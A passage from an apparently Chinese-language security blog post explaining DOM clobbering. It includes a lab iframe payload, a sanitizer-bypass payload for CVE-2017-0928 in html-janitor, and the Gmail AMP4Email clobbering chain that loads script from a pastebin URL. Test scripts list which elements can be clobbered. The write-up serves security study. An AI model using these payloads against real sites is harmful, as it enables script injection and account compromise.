&#x8BF7;&#x6C42;&#x62FF;&#x5230;&#x7684;&#xFF0C;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x7684;&#x8BDD;&#xFF0C;Dom &#x6811;&#x662F;&#x8FD8;&#x6CA1;&#x6709;&#x8BC4;&#x8BBA;&#x7684;&#xFF0C;&#x5F97;&#x9700;&#x8981;&#x7B49;&#x5F85; JS &#x6267;&#x884C;&#x5B8C;&#x6210;&#x624D;&#x4F1A;&#x6709;&#x8BC4;&#x8BBA;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5EF6;&#x65F6;&#x6216;&#x8005;&#x963B;&#x585E;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x662F;&#x5229;&#x7528;<code>iframe</code>&#x8FDB;&#x884C;<code>setTimeout</code></p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">https://your-lab-id.web-security-academy.net/post?postId</span>=<span class="hljs-string">3</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;setTimeout(a=&gt;this.src=this.src+&apos;#x&apos;,500)&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x8981;&#x6CE8;&#x610F;&#x4E00;&#x5B9A;&#x8981;&#x5F97;&#x7B49;&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x518D;&#x7528;<code>#x</code>&#x9009;&#x62E9;<code>form</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684; 500ms &#x9700;&#x8981;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x7EDC;&#x60C5;&#x51B5;&#x9002;&#x5F53;&#x8C03;&#x6574;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png" alt></p><h3 id="CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering"><a href="#CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering" class="headerlink" title="CVE-2017-0928 Bypassing sanitization using DOM clobbering"></a>CVE-2017-0928 Bypassing sanitization using DOM clobbering</h3><p><a href="https://github.com/guardian/html-janitor/" target="_blank" rel="noopener">html-janitor</a> &#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E0A;&#x6587;&#x7528;&#x5230;&#x7684; HTML filters&#xFF0C;&#x5728; v2.0.2 &#x5F53;&#x4E2D;&#xFF0C;janitor &#x5728;&#x5FAA;&#x73AF;&#x4E2D;&#x6709;&#x8FD9;&#x4E48;&#x51E0;&#x884C;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">do</span> {</span><br><span class="line">  <span class="hljs-comment">// Ignore nodes that have already been sanitized</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (node._sanitized) {</span><br><span class="line">    <span class="hljs-keyword">continue</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">  <span class="hljs-comment">// Sanitize children</span></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(node);</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-comment">// Mark node as sanitized so it&apos;s ignored in future runs</span></span><br><span class="line">  node._sanitized = <span class="hljs-literal">true</span>;</span><br><span class="line">} <span class="hljs-keyword">while</span> ((node = treeWalker.nextSibling()));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;<code>_sanitized</code>&#x4F5C;&#x4E3A;&#x6807;&#x5FD7;&#x4F4D;&#x6765;&#x6807;&#x5FD7;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x5316;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#xFF0C;&#x7531;&#x6211;&#x4EEC;&#x4E0A;&#x4E2A;&#x4F8B;&#x5B50;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E0E;&#x4E0A;&#x4E2A;&#x4F8B;&#x5B50;&#x7C7B;&#x4F3C;&#x7684; payload &#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A; if &#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x6807;&#x51C6;&#x5316;&#x8FC7;&#x6EE4;&#x4E86;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(document.domain)</span> <span class="hljs-attr">name</span>=<span class="hljs-string">_sanitized</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4FEE;&#x590D;&#x65B9;&#x6848;&#x662F;&#x5220;&#x9664;&#x4E86;&#x8FD9;&#x4E9B;&#x5224;&#x65AD;&#xFF0C;&#x5BF9;&#x5B50;&#x6811;&#x5229;&#x7528;&#x9012;&#x5F52;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x5316;&#x8FC7;&#x6EE4;&#x3002;</p><h3 id="XSS-in-GMail&#x2019;s-AMP4Email-via-DOM-Clobbering"><a href="#XSS-in-GMail&#x2019;s-AMP4Email-via-DOM-Clobbering" class="headerlink" title="XSS in GMail&#x2019;s AMP4Email via DOM Clobbering"></a>XSS in GMail&#x2019;s AMP4Email via DOM Clobbering</h3><p>&#x7EC8;&#x4E8E;&#x5230;&#x4E86;&#x6211;&#x4EEC;&#x5F00;&#x5934;&#x63D0;&#x5230;&#x7684; OWASP Top 10 &#x63D0;&#x540D;&#x7684;&#x653B;&#x51FB;&#x5B9E;&#x4F8B;&#x4E86;&#xFF0C;&#x4F5C;&#x8005;&#x9996;&#x5148;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x5728;&#x63A7;&#x5236;&#x53F0;&#x8F93;&#x5165; window &#x8FDB;&#x884C; fuzz</p><p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png" alt></p><p>&#x8FD9;&#x91CC;&#x4ED6;&#x9996;&#x5148;&#x5229;&#x7528;&#x4E86;<code>AMP</code>&#xFF0C;&#x5C1D;&#x8BD5;&#x63D2;&#x5165;<code>&lt;a id=AMP&gt;</code>&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;<code>AMP</code>&#x88AB; ban &#x4E86;</p><p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png" alt></p><p>&#x63A5;&#x7740;&#x627E;&#x5230;&#x4E0B;&#x4E00;&#x4E2A;<code>AMP_MODE</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x6CA1;&#x6709;&#x88AB; ban &#xFF0C;&#x53CD;&#x800C;&#x8BA9;&#x4F5C;&#x8005;&#x53D1;&#x73B0;&#x4E86;&#x8FD9;&#x91CC;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#x7684; URL &#x5F53;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;<code>undefined</code></p><p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png" alt></p><p>&#x8FD9;&#x5C31;&#x662F;&#x4F5C;&#x8005;&#x63D2;&#x5165;&#x4E86;<code>&lt;a id=AMP_MODE&gt;</code>&#x5BFC;&#x81F4;&#x4EA7;&#x751F;&#x7684;<code>undefined</code>&#xFF0C;&#x4E3B;&#x8981;&#x4EA7;&#x751F;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x4EE3;&#x7801;&#x7ECF;&#x4F5C;&#x8005;&#x7B80;&#x5316;&#x540E;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> script = <span class="hljs-built_in">window</span>.document.createElement(<span class="hljs-string">&quot;script&quot;</span>);</span><br><span class="line">script.async = <span class="hljs-literal">false</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> loc;</span><br><span class="line"><span class="hljs-keyword">if</span> (AMP_MODE.test &amp;&amp; <span class="hljs-built_in">window</span>.testLocation) {</span><br><span class="line">    loc = <span class="hljs-built_in">window</span>.testLocation</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    loc = <span class="hljs-built_in">window</span>.location;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">if</span> (AMP_MODE.localDev) {</span><br><span class="line">    loc = loc.protocol + <span class="hljs-string">&quot;//&quot;</span> + loc.host + <span class="hljs-string">&quot;/dist&quot;</span></span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    loc = <span class="hljs-string">&quot;https://cdn.ampproject.org&quot;</span>;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="hljs-string">&quot;/&quot;</span> : <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="line">b.src = loc + <span class="hljs-string">&quot;/rtv/&quot;</span> + AMP_MODE.rtvVersion; + <span class="hljs-string">&quot;/&quot;</span> + singlePass + <span class="hljs-string">&quot;v0/&quot;</span> + pluginName + <span class="hljs-string">&quot;.js&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE3;&#x7801;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5982;&#x679C;&#x518D;&#x8981;&#x7B80;&#x5316;&#x5230;&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#x5C31;&#x662F;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> script = <span class="hljs-built_in">window</span>.document.createElement(<span class="hljs-string">&quot;script&quot;</span>);</span><br><span class="line">script.async = <span class="hljs-literal">false</span>;</span><br><span class="line"> </span><br><span class="line">b.src = <span class="hljs-built_in">window</span>.testLocation.protocol + <span class="hljs-string">&quot;//&quot;</span> +</span><br><span class="line">        <span class="hljs-built_in">window</span>.testLocation.host + <span class="hljs-string">&quot;/dist/rtv/&quot;</span> +</span><br><span class="line">        AMP_MODE.rtvVersion; + <span class="hljs-string">&quot;/&quot;</span> +</span><br><span class="line">        (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="hljs-string">&quot;/&quot;</span> : <span class="hljs-string">&quot;&quot;</span>) +</span><br><span class="line">        <span class="hljs-string">&quot;v0/&quot;</span> + pluginName + <span class="hljs-string">&quot;.js&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; Dom Clobbering &#x6765;&#x8BA9;&#x5B83;&#x52A0;&#x8F7D;&#x6211;&#x4EEC;&#x4EFB;&#x610F;&#x7684; js &#x6587;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;&#x52AB;&#x6301;<code>protocol</code>&#x5230;&#x6211;&#x4EEC;&#x4EFB;&#x610F; URL&#xFF0C;&#x518D;&#x5229;&#x7528;<code>#</code>&#x6CE8;&#x91CA;&#x6389;&#x540E;&#x9762;&#x7684;&#x5373;&#x53EF;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;localDev&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">&lt;!-- window.testLocation.protocol is a base for the URL --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testLocation&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testLocation&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;protocol&quot;</span></span></span><br><span class="line"><span class="hljs-tag">   <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://pastebin.com/raw/0tn8z0rG#&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136; URL &#x6784;&#x9020;&#x51FA;&#x6765;&#x4E86;&#xFF0C;&#x4F46;&#x662F; Google &#x8FD8;&#x6709; CSP</p><p></p><figure class="highlight gams hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src <span class="hljs-string">&apos;none&apos;</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">script</span></span>-src <span class="hljs-string">&apos;sha512-oQwIl...==&apos;</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/rtv/</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/v0.js</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/v0/</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136;&#x4ED6;&#x5F53;&#x65F6;&#x6CA1;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F46;&#x662F; Google &#x8FD8;&#x662F;&#x5168;&#x989D;&#x5730;&#x7ED9;&#x4E86;&#x4ED6;&#x5956;&#x91D1;&#x3002;</p><p>&#x53E6;&#x5916;&#x8FD9;&#x4E2A; CSP &#x53EF;&#x4EE5;&#x5229;&#x7528;<code>..%252f</code>&#x7684; trick &#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x7531;&#x4E8E;&#x4E0D;&#x5C5E;&#x4E8E;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x4E86;&#xFF0C;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x81EA;&#x884C;&#x641C;&#x7D22;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x7531;&#x4E8E;&#x7BC7;&#x5E45;&#x5173;&#x7CFB;&#xFF0C;&#x5C31;&#x4E0D;&#x518D;&#x5217;&#x4E3E;&#x66F4;&#x591A;&#x7684;&#x4F8B;&#x5B50;&#x4E86;&#xFF0C;&#x6211;&#x4F1A;&#x628A;&#x6700;&#x8FD1;&#x81EA;&#x5DF1;&#x505A;&#x7684;&#x4E00;&#x4E9B; XSS Game &#x4E2D;&#x6D89;&#x53CA;&#x5230; Dom Clobbering &#x7684;&#x90E8;&#x5206;&#x4EE5; Tip &#x7684;&#x5F62;&#x5F0F;&#x5199;&#x51FA;&#x6765;&#x3002;</p><h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><p>&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x63D0;&#x5230;&#x8FC7;&#x6216;&#x8BB8;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x67D0;&#x4E9B;&#x5C5E;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4E0D;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x6216;&#x8005;&#x8BF4;&#x5B8C;&#x5168;&#x63A7;&#x5236;<code>document.cookie</code>&#x5462;&#xFF1F;&#x7A76;&#x7ADF;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x54EA;&#x4E9B;&#x5462;&#xFF1F;&#x53C8;&#x53EF;&#x4EE5;&#x600E;&#x4E48;&#x5229;&#x7528;&#x5462;&#xFF1F;&#x54EA;&#x4E9B;&#x53EF;&#x4EE5;&#x7528; ID &#x54EA;&#x4E9B;&#x7528; Name&#x5462;&#xFF1F;</p><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;&#x54EA;&#x4E9B;&#x7528; id &#x54EA;&#x4E9B;&#x7528; name &#xFF1F;</p><h3 id="Document-amp-Id"><a href="#Document-amp-Id" class="headerlink" title="Document &amp; Id"></a>Document &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>) &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x53EA;&#x6709;<code>object</code>&#x6807;&#x7B7E;<code>document</code>&#x53EF;&#x4EE5;&#x901A;&#x8FC7; id &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Document-amp-Name"><a href="#Document-amp-Name" class="headerlink" title="Document &amp; Name"></a>Document &amp; Name</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;x&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4EE5;&#x4E0B;&#x4E94;&#x4E2A;&#x5143;&#x7D20;&#x53EF;&#x4EE5;&#x8BA9;<code>document</code>&#x901A;&#x8FC7; name &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#xA0;[<span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Document-amp-Name-amp-Id"><a href="#Document-amp-Name-amp-Id" class="headerlink" title="Document &amp; Name &amp; Id"></a>Document &amp; Name &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x name=y &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (</span><br><span class="line">    <span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;y&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span></span><br><span class="line">  ) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x4E0B;&#x4E09;&#x4E2A;&#x5143;&#x7D20;&#xFF1A;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-amp-Id"><a href="#Window-amp-Id" class="headerlink" title="Window &amp; Id"></a>Window &amp; Id</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.x == <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>) &amp;&amp; <span class="hljs-built_in">window</span>.x != <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9664;&#x4E86;&#x5728; [Not Clobbered](#Not Clobbered) &#x90E8;&#x5206;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x5176;&#x4ED6;&#x6807;&#x7B7E;<code>window</code>&#x5747;&#x53EF;&#x901A;&#x8FC7; id &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight scheme hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-name">128</span>) [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;abbr&quot;</span>, <span class="hljs-string">&quot;acronym&quot;</span>, <span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;applet&quot;</span>, <span class="hljs-string">&quot;area&quot;</span>, <span class="hljs-string">&quot;article&quot;</span>, <span class="hljs-string">&quot;aside&quot;</span>, <span class="hljs-string">&quot;audio&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;base&quot;</span>, <span class="hljs-string">&quot;basefont&quot;</span>, <span class="hljs-string">&quot;bdi&quot;</span>, <span class="hljs-string">&quot;bdo&quot;</span>, <span class="hljs-string">&quot;bgsound&quot;</span>, <span class="hljs-string">&quot;big&quot;</span>, <span class="hljs-string">&quot;blink&quot;</span>, <span class="hljs-string">&quot;blockquote&quot;</span>, <span class="hljs-string">&quot;br&quot;</span>, <span class="hljs-string">&quot;button&quot;</span>, <span class="hljs-string">&quot;canvas&quot;</span>, <span class="hljs-string">&quot;center&quot;</span>, <span class="hljs-string">&quot;cite&quot;</span>, <span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>, <span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;datalist&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;del&quot;</span>, <span class="hljs-string">&quot;details&quot;</span>, <span class="hljs-string">&quot;dfn&quot;</span>, <span class="hljs-string">&quot;dialog&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;div&quot;</span>, <span class="hljs-string">&quot;dl&quot;</span>, <span class="hljs-string">&quot;dt&quot;</span>, <span class="hljs-string">&quot;element&quot;</span>, <span class="hljs-string">&quot;em&quot;</span>, <span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;fieldset&quot;</span>, <span class="hljs-string">&quot;figcaption&quot;</span>, <span 